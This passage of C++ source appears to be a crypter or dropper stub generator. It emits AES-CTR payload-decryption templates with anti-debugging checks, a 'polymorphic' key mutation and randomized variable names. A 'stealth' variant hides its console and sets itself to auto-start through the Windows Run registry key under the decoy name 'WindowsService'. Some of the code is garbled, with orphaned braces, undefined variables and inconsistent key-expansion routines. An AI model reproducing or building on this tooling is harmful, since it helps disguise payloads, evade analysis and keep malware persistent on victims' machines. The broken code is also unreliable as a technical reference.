    for (size_t i = 0; i < size; i++) {
        data[i] ^= {KEY_VAR}[i % 16] ^ {NONCE_VAR}[i % 16];
    }
    
    std::ofstream out("output.bin", std::ios::binary);
    out.write(reinterpret_cast<char*>(data), size);
    return 0;
}
)";
        } else if (stubType == "standalone_basic") {
            return R"(
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <random>
#include <ctime>

// Standalone Basic Stub - Simple and clean
{KEY_DEFINITION}
{NONCE_DEFINITION}

// AES-128-CTR implementation
static const uint8_t sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

// AES helper functions
inline uint8_t gmul(uint8_t a, uint8_t b) {
    uint8_t p = 0;
    for (int i = 0; i < 8; i++) {
        if (b & 1) p ^= a;
        bool hi_bit_set = a & 0x80;
        a <<= 1;
        if (hi_bit_set) a ^= 0x1b;
        b >>= 1;
    }
    return p;
}

inline void subBytes(uint8_t* state) {
    for (int i = 0; i < 16; i++) {
        state[i] = sbox[state[i]];
    }
}

inline void shiftRows(uint8_t* state) {
    uint8_t temp;
    temp = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = temp;
    temp = state[2]; state[2] = state[10]; state[10] = temp;
    temp = state[6]; state[6] = state[14]; state[14] = temp;
    temp = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = temp;
}

inline void mixColumns(uint8_t* state) {
    for (int i = 0; i < 4; i++) {
        uint8_t s0 = state[i*4], s1 = state[i*4+1], s2 = state[i*4+2], s3 = state[i*4+3];
        state[i*4] = gmul(0x02, s0) ^ gmul(0x03, s1) ^ s2 ^ s3;
        state[i*4+1] = s0 ^ gmul(0x02, s1) ^ gmul(0x03, s2) ^ s3;
        state[i*4+2] = s0 ^ s1 ^ gmul(0x02, s2) ^ gmul(0x03, s3);
        state[i*4+3] = gmul(0x03, s0) ^ s1 ^ s2 ^ gmul(0x02, s3);
    }
}

inline void addRoundKey(uint8_t* state, const uint8_t* roundKey) {
    for (int i = 0; i < 16; i++) {
        state[i] ^= roundKey[i];
    }
}

inline void keyExpansion(const uint8_t* key, uint8_t* roundKeys) {
    uint8_t temp[4];
    memcpy(roundKeys, key, 16);
    
    for (int i = 1; i < 11; i++) {
        memcpy(temp, roundKeys + (i-1)*16 + 12, 4);
        uint8_t t = temp[0]; temp[0] = temp[1]; temp[1] = temp[2]; temp[2] = temp[3]; temp[3] = t;
        for (int j = 0; j < 4; j++) temp[j] = sbox[temp[j]];
        temp[0] ^= (1 << (i-1));
        for (int j = 0; j < 4; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ temp[j];
        for (int j = 4; j < 16; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ roundKeys[i*16 + j-4];
    }
}

inline void aesEncryptBlock(const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
    uint8_t state[16];
    memcpy(state, input, 16);
    addRoundKey(state, roundKeys);
    
    for (int round = 1; round < 10; round++) {
        subBytes(state);
        shiftRows(state);
        mixColumns(state);
        addRoundKey(state, roundKeys + round * 16);
    }
    
    subBytes(state);
    shiftRows(state);
    addRoundKey(state, roundKeys + 10 * 16);
    memcpy(output, state, 16);
}

inline void incrementCounter(uint8_t* counter) {
    for (int i = 15; i >= 0; i--) {
        counter[i]++;
        if (counter[i] != 0) break;
    }
}

inline void aesCtrCrypt(const uint8_t* input, uint8_t* output, size_t length, 
                       const uint8_t* key, const uint8_t* nonce) {
    uint8_t roundKeys[176];
    keyExpansion(key, roundKeys);
    
    uint8_t counter[16];
    uint8_t keystream[16];
    memcpy(counter, nonce, 16);
    
    size_t processed = 0;
    while (processed < length) {
        aesEncryptBlock(counter, keystream, roundKeys);
        size_t blockSize = (length - processed < 16) ? length - processed : 16;
        for (size_t i = 0; i < blockSize; i++) {
            output[processed + i] = input[processed + i] ^ keystream[i];
        }
        processed += blockSize;
        incrementCounter(counter);
    }
}

void hexToBytes(const std::string& hex, uint8_t* bytes) {
    for (size_t i = 0; i < hex.length(); i += 2) {
        bytes[i/2] = std::stoi(hex.substr(i, 2), nullptr, 16);
    }
}

int main() {
    // Standalone stub - no embedded data
    {EMBEDDED_DATA}
    
    // Convert hex strings to bytes
    uint8_t key[16], nonce[16];
    hexToBytes({KEY_VAR}, key);
    hexToBytes({NONCE_VAR}, nonce);
    
    // Decrypt the data using AES-128-CTR
    // Note: embeddedData and embeddedDataSize will be added by stub linker
    // aesCtrCrypt(embeddedData, embeddedData, embeddedDataSize, key, nonce);
    
    // Write decrypted data to file
    // Note: embeddedData and embeddedDataSize will be added by stub linker
    // std::ofstream outFile("decrypted_output.bin", std::ios::binary);
    // if (outFile.is_open()) {
    //     outFile.write(reinterpret_cast<char*>(embeddedData), embeddedDataSize);
        outFile.close();
        std::cout << "Data decrypted and saved to decrypted_output.bin" << std::endl;
    } else {
        std::cerr << "Failed to create output file" << std::endl;
        return 1;
    }
    
    return 0;
}
)";
        } else if (stubType == "standalone_advanced") {
            return R"(
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <random>
#include <ctime>
#include <chrono>
#include <thread>

// Standalone Advanced Stub - Anti-debugging + Polymorphism
{KEY_DEFINITION}
{NONCE_DEFINITION}

// Anti-debugging and polymorphic features
class PolymorphicEngine {
private:
    static const uint32_t POLY_KEY = 0xDEADBEEF;
    
public:
    static uint8_t mutateByte(uint8_t byte, uint32_t seed) {
        return byte ^ ((seed * POLY_KEY) & 0xFF);
    }
    
    static void mutateArray(uint8_t* data, size_t size, uint32_t seed) {
        for (size_t i = 0; i < size; i++) {
            data[i] = mutateByte(data[i], seed + i);
        }
    }
    
    static void demutateArray(uint8_t* data, size_t size, uint32_t seed) {
        mutateArray(data, size, seed); // XOR is symmetric
    }
};

// Anti-debugging checks
bool isDebuggerPresent() {
    #ifdef _WIN32
    return IsDebuggerPresent();
    #else
    return false;
    #endif
}

bool checkTiming() {
    auto start = std::chrono::high_resolution_clock::now();
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
    return duration.count() < 95; // If too fast, likely debugger
}

// AES-128-CTR implementation (same as basic)
static const uint8_t sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

// AES helper functions (same as basic)
inline uint8_t gmul(uint8_t a, uint8_t b) {
    uint8_t p = 0;
    for (int i = 0; i < 8; i++) {
        if (b & 1) p ^= a;
        bool hi_bit_set = a & 0x80;
        a <<= 1;
        if (hi_bit_set) a ^= 0x1b;
        b >>= 1;
    }
    return p;
}

inline void subBytes(uint8_t* state) {
    for (int i = 0; i < 16; i++) {
        state[i] = sbox[state[i]];
    }
}

inline void shiftRows(uint8_t* state) {
    uint8_t temp;
    temp = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = temp;
    temp = state[2]; state[2] = state[10]; state[10] = temp;
    temp = state[6]; state[6] = state[14]; state[14] = temp;
    temp = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = temp;
}

inline void mixColumns(uint8_t* state) {
    for (int i = 0; i < 4; i++) {
        uint8_t s0 = state[i*4], s1 = state[i*4+1], s2 = state[i*4+2], s3 = state[i*4+3];
        state[i*4] = gmul(0x02, s0) ^ gmul(0x03, s1) ^ s2 ^ s3;
        state[i*4+1] = s0 ^ gmul(0x02, s1) ^ gmul(0x03, s2) ^ s3;
        state[i*4+2] = s0 ^ s1 ^ gmul(0x02, s2) ^ gmul(0x03, s3);
        state[i*4+3] = gmul(0x03, s0) ^ s1 ^ s2 ^ gmul(0x02, s3);
    }
}

inline void addRoundKey(uint8_t* state, const uint8_t* roundKey) {
    for (int i = 0; i < 16; i++) {
        state[i] ^= roundKey[i];
    }
}

inline void keyExpansion(const uint8_t* key, uint8_t* roundKeys) {
    uint8_t temp[4];
    
    // Copy the original key
    for (int i = 0; i < 16; i++) {
        roundKeys[i] = key[i];
    }
    
    for (int i = 4; i < 44; i++) {
        for (int j = 0; j < 4; j++) {
            temp[j] = roundKeys[(i-1)*4 + j];
        }
        
        if (i % 4 == 0) {
            // RotWord
            uint8_t t = temp[0];
            temp[0] = temp[1];
            temp[1] = temp[2];
            temp[2] = temp[3];
            temp[3] = t;
            
            // SubWord
            for (int j = 0; j < 4; j++) {
                temp[j] = sbox[temp[j]];
            }
            
            // XOR with Rcon
            temp[0] ^= rcon[i/4 - 1];
        }
        
        for (int j = 0; j < 4; j++) {
            roundKeys[i*4 + j] = roundKeys[(i-4)*4 + j] ^ temp[j];
        }
    }
}

inline void aesEncryptBlock(const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
    uint8_t state[16];
    for (int i = 0; i < 16; i++) state[i] = input[i];
    addRoundKey(state, roundKeys);
    for (int round = 1; round < 10; round++) {
        subBytes(state); shiftRows(state); mixColumns(state); addRoundKey(state, roundKeys + round * 16);
    }
    subBytes(state); shiftRows(state); addRoundKey(state, roundKeys + 10 * 16);
    for (int i = 0; i < 16; i++) output[i] = state[i];
}

inline void incrementCounter(uint8_t* counter) {
    for (int i = 15; i >= 0; i--) {
        counter[i]++;
        if (counter[i] != 0) break;
    }
}

inline void aesCtrCrypt(const uint8_t* input, uint8_t* output, size_t length, 
                       const uint8_t* key, const uint8_t* nonce) {
    uint8_t roundKeys[176];
    keyExpansion(key, roundKeys);
    uint8_t counter[16];
    uint8_t keystream[16];
    for (int i = 0; i < 16; i++) counter[i] = nonce[i];
    size_t processed = 0;
    while (processed < length) {
        aesEncryptBlock(counter, keystream, roundKeys);
        size_t blockSize = (length - processed < 16) ? length - processed : 16;
        for (size_t i = 0; i < blockSize; i++) {
            output[processed + i] = input[processed + i] ^ keystream[i];
        }
        processed += blockSize;
        incrementCounter(counter);
    }
}

void hexToBytes(const std::string& hex, uint8_t* bytes) {
    for (size_t i = 0; i < hex.length(); i += 2) {
        bytes[i/2] = std::stoi(hex.substr(i, 2), nullptr, 16);
    }
}

int main() {
    // Anti-debugging checks
    if (isDebuggerPresent() || checkTiming()) {
        return 1; // Exit if debugger detected
    }
    
    // Standalone stub - no embedded data
    {EMBEDDED_DATA}
    
    // Convert hex strings to bytes
    uint8_t key[16], nonce[16];
    hexToBytes({KEY_VAR}, key);
    hexToBytes({NONCE_VAR}, nonce);
    
    // Polymorphic mutation/demutation
    uint32_t seed = std::time(nullptr);
    PolymorphicEngine::mutateArray(key, 16, seed);
    PolymorphicEngine::mutateArray(nonce, 16, seed);
    
    // Decrypt the data using AES-128-CTR
    // Note: embeddedData and embeddedDataSize will be added by stub linker
    // aesCtrCrypt(embeddedData, embeddedData, embeddedDataSize, key, nonce);
    
    // Demutate the key and nonce
    PolymorphicEngine::demutateArray(key, 16, seed);
    PolymorphicEngine::demutateArray(nonce, 16, seed);
    
    // Write decrypted data to file
    // Note: embeddedData and embeddedDataSize will be added by stub linker
    // std::ofstream outFile("decrypted_output.bin", std::ios::binary);
    // if (outFile.is_open()) {
    //     outFile.write(reinterpret_cast<char*>(embeddedData), embeddedDataSize);
        outFile.close();
        std::cout << "Data decrypted and saved to decrypted_output.bin" << std::endl;
    } else {
        std::cerr << "Failed to create output file" << std::endl;
        return 1;
    }
    
    return 0;
}
)";
        } else if (stubType == "standalone_stealth") {
            return R"(
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <random>
#include <ctime>
#include <chrono>
#include <thread>

#ifdef _WIN32
#include <windows.h>
#endif

// Standalone Stealth Stub - Silent operation + Auto-startup
{KEY_DEFINITION}
{NONCE_DEFINITION}

// Stealth features
void setupAutoStartup() {
    #ifdef _WIN32
    HKEY hKey;
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsService", 0, REG_SZ, 
            (const BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
    #endif
}

void hideConsole() {
    #ifdef _WIN32
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    #endif
}

// AES-128-CTR implementation (same as basic)
static const uint8_t sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

// AES helper functions (same as basic)
inline uint8_t gmul(uint8_t a, uint8_t b) {
    uint8_t p = 0;
    for (int i = 0; i < 8; i++) {
        if (b & 1) p ^= a;
        bool hi_bit_set = a & 0x80;
        a <<= 1;
        if (hi_bit_set) a ^= 0x1b;
        b >>= 1;
    }
    return p;
}

inline void subBytes(uint8_t* state) {
    for (int i = 0; i < 16; i++) {
        state[i] = sbox[state[i]];
    }
}

inline void shiftRows(uint8_t* state) {
    uint8_t temp;
    temp = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = temp;
    temp = state[2]; state[2] = state[10]; state[10] = temp;
    temp = state[6]; state[6] = state[14]; state[14] = temp;
    temp = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = temp;
}

inline void mixColumns(uint8_t* state) {
    for (int i = 0; i < 4; i++) {
        uint8_t s0 = state[i*4], s1 = state[i*4+1], s2 = state[i*4+2], s3 = state[i*4+3];
        state[i*4] = gmul(0x02, s0) ^ gmul(0x03, s1) ^ s2 ^ s3;
        state[i*4+1] = s0 ^ gmul(0x02, s1) ^ gmul(0x03, s2) ^ s3;
        state[i*4+2] = s0 ^ s1 ^ gmul(0x02, s2) ^ gmul(0x03, s3);
        state[i*4+3] = gmul(0x03, s0) ^ s1 ^ s2 ^ gmul(0x02, s3);
    }
}

inline void addRoundKey(uint8_t* state, const uint8_t* roundKey) {
    for (int i = 0; i < 16; i++) {
        state[i] ^= roundKey[i];
    }
}

inline void keyExpansion(const uint8_t* key, uint8_t* roundKeys) {
    uint8_t temp[4];
    memcpy(roundKeys, key, 16);
    
    for (int i = 1; i < 11; i++) {
        memcpy(temp, roundKeys + (i-1)*16 + 12, 4);
        uint8_t t = temp[0]; temp[0] = temp[1]; temp[1] = temp[2]; temp[2] = temp[3]; temp[3] = t;
        for (int j = 0; j < 4; j++) temp[j] = sbox[temp[j]];
        temp[0] ^= (1 << (i-1));
        for (int j = 0; j < 4; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ temp[j];
        for (int j = 4; j < 16; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ roundKeys[i*16 + j-4];
    }
}

inline void aesEncryptBlock(const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
    uint8_t state[16];
    memcpy(state, input, 16);
    addRoundKey(state, roundKeys);
    
    for (int round = 1; round < 10; round++) {
        subBytes(state);
        shiftRows(state);
        mixColumns(state);
        addRoundKey(state, roundKeys + round * 16);
    }
    
    subBytes(state);
    shiftRows(state);
    addRoundKey(state, roundKeys + 10 * 16);
    memcpy(output, state, 16);
}

inline void incrementCounter(uint8_t* counter) {
    for (int i = 15; i >= 0; i--) {
        counter[i]++;
        if (counter[i] != 0) break;
    }
}

inline void aesCtrCrypt(const uint8_t* input, uint8_t* output, size_t length, 
                       const uint8_t* key, const uint8_t* nonce) {
    uint8_t roundKeys[176];
    keyExpansion(key, roundKeys);
    
    uint8_t counter[16];
    uint8_t keystream[16];
    memcpy(counter, nonce, 16);
    
    size_t processed = 0;
    while (processed < length) {
        aesEncryptBlock(counter, keystream, roundKeys);
        size_t blockSize = (length - processed < 16) ? length - processed : 16;
        for (size_t i = 0; i < blockSize; i++) {
            output[processed + i] = input[processed + i] ^ keystream[i];
        }
        processed += blockSize;
        incrementCounter(counter);
    }
}

void hexToBytes(const std::string& hex, uint8_t* bytes) {
    for (size_t i = 0; i < hex.length(); i += 2) {
        bytes[i/2] = std::stoi(hex.substr(i, 2), nullptr, 16);
    }
}

int main() {
    // Stealth mode - hide console
    hideConsole();
    
    // Setup auto-startup
    setupAutoStartup();
    
    // Standalone stub - no embedded data
    {EMBEDDED_DATA}
    
    // Convert hex strings to bytes
    uint8_t key[16], nonce[16];
    hexToBytes({KEY_VAR}, key);
    hexToBytes({NONCE_VAR}, nonce);
    
    // Decrypt the data using AES-128-CTR
    // Note: embeddedData and embeddedDataSize will be added by stub linker
    // aesCtrCrypt(embeddedData, embeddedData, embeddedDataSize, key, nonce);
    
    // Write decrypted data to file (silent)
    // Note: embeddedData and embeddedDataSize will be added by stub linker
    // std::ofstream outFile("decrypted_output.bin", std::ios::binary);
    // if (outFile.is_open()) {
    //     outFile.write(reinterpret_cast<char*>(embeddedData), embeddedDataSize);
        outFile.close();
    }
    
    return 0;
}
)";
        }
        
        return "// Invalid stub type";
    }
    
    std::string embedDataAsArray(const std::vector<uint8_t>& data) {
        std::stringstream ss;
        ss << "{";
        for (size_t i = 0; i < data.size(); ++i) {
            if (i > 0) ss << ", ";
            ss << "0x" << std::hex << std::setw(2) << std::setfill('0') << (int)data[i];
        }
        ss << "}";
        return ss.str();
    }
    


public:
    NativeStubGenerator() {
        // Use high-quality entropy for seeding
        std::random_device rd;
        std::seed_seq seed{rd(), rd(), rd(), rd(), 
                          static_cast<unsigned int>(std::time(nullptr)),
                          static_cast<unsigned int>(std::clock())};
        rng.seed(seed);
    }
    
    void generateStandaloneStub(const std::string& outputFile, 
                               const std::string& stubType = "basic", bool useRandomKey = true) {
        std::cout << "Generating standalone stub..." << std::endl;
        
        // Reseed RNG for maximum uniqueness
        std::random_device rd;
        std::seed_seq seed{rd(), rd(), rd(), rd(), 
                          static_cast<unsigned int>(std::time(nullptr)),
                          static_cast<unsigned int>(std::clock())};
        rng.seed(seed);
        
        // Generate random key and nonce for the standalone stub using proper RNG
        std::string keyHex = useRandomKey ? generateRandomKeyWithRNG() : "3939080f0f3808313832383939080f0f";
        std::string nonceHex = generateRandomNonceWithRNG();
        
        // Get the stub template
        std::string stubCode = generateStubTemplate(stubType);
        
        // Always randomize variable names for all stub types
        std::string keyVarName = "KEY_" + generateRandomString(8);
        std::string nonceVarName = "NONCE_" + generateRandomString(8);
        
        // Replace key and nonce placeholders
        size_t keyPos = stubCode.find("{KEY_DEFINITION}");
        if (keyPos != std::string::npos) {
            std::string keyDef = "const std::string " + keyVarName + " = \"" + keyHex + "\";";
            stubCode.replace(keyPos, 16, keyDef);
        }
        
        size_t noncePos = stubCode.find("{NONCE_DEFINITION}");
        if (noncePos != std::string::npos) {
            std::string nonceDef = "const std::string " + nonceVarName + " = \"" + nonceHex + "\";";
            stubCode.replace(noncePos, 18, nonceDef);
        }
        
        // Replace variable names in the code
        size_t keyUsagePos = stubCode.find("{KEY_VAR}");
        while (keyUsagePos != std::string::npos) {
            stubCode.replace(keyUsagePos, 9, keyVarName);
            keyUsagePos = stubCode.find("{KEY_VAR}");
        }
        
        size_t nonceUsagePos = stubCode.find("{NONCE_VAR}");
        while (nonceUsagePos != std::string::npos) {
            stubCode.replace(nonceUsagePos, 11, nonceVarName);
            nonceUsagePos = stubCode.find("{NONCE_VAR}");
        }
        
        // Remove embedded data placeholder for standalone stub
        size_t dataPos = stubCode.find("{EMBEDDED_DATA}");
        if (dataPos != std::string::npos) {
            stubCode.replace(dataPos, 14, "// Standalone stub - no embedded data");
        }
        
        // Write the standalone stub
        std::ofstream outFile(outputFile);
        if (!outFile.is_open()) {
            std::cerr << "Error: Cannot create output file: " << outputFile << std::endl;
            return;
        }
        
        outFile << stubCode;
        outFile.close();
        
        std::cout << "\u2713 Standalone stub generated successfully!" << std::endl;
        std::cout << "  Output stub: " << outputFile << std::endl;
        std::cout << "  Stub type: " << stubType << std::endl;
        std::cout << "  Key: " << keyHex << std::endl;
        std::cout << "  Nonce: " << nonceHex << std::endl;
        std::cout << "  To use: Compile this stub and link it with your encrypted file" << std::endl;
    }
    
    void generateStub(const std::string& inputFile, const std::string& outputFile, 
                     const std::string& stubType = "basic", bool useRandomKey = true) {
        // Reseed RNG for maximum uniqueness
        std::random_device rd;
        std::seed_seq seed{rd(), rd(), rd(), rd(), 
                          static_cast<unsigned int>(std::time(nullptr)),
                          static_cast<unsigned int>(std::clock())};
        rng.seed(seed);
        
        // Read input file
        std::ifstream inFile(inputFile, std::ios::binary);
        if (!inFile.is_open()) {
            std::cerr << "Error: Cannot open input file: " << inputFile << std::endl;
            return;
        }
        // Read the file data
        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(inFile)),
                                    std::istreambuf_iterator<char>());
        inFile.close();
        if (fileData.empty()) {
            std::cerr << "Error: Input file is empty" << std::endl;
            return;
        }
        // Generate nonce
        uint8_t nonce[16];
        for (int i = 0; i < 16; i++) {
            nonce[i] = simpleRand() & 0xFF;
        }
        // Use the same key system as encryptor/dropper
        uint8_t encKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
        constexpr size_t keyLen = sizeof(encKey);
        uint8_t key[keyLen];
        const char* envKey = std::getenv("ENCRYPTION_KEY");
        if (envKey && strlen(envKey) >= keyLen) {
            for (size_t i = 0; i < keyLen; ++i) {
                key[i] = static_cast<uint8_t>(envKey[i]);
            }
        } else {
